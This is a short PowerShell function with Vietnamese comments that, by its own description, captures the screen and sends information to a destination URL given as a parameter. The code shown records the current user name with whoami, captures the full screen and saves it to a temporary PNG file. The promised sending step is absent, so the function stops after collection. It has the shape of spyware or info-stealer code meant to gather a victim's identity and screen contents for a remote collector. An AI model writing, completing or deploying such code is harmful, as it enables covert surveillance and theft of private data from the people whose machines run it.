# Hàm chụp ảnh màn hình và gửi thông tin
function info {
    param(
        [Parameter(Mandatory = $true)]
        [String]$hq # URL đích để gửi thông tin
    )

    # Thu thập tên người dùng hiện tại
    $name = whoami

    # Chụp ảnh màn hình
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
    $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
    $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

    # Lưu ảnh vào file tạm thời
    $screenshotPath = "$env:TEMP\screenshot_$([System.Guid]::NewGuid()).png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

    $graphics.Dispose()
    $bitmap.Dispose()

   
}

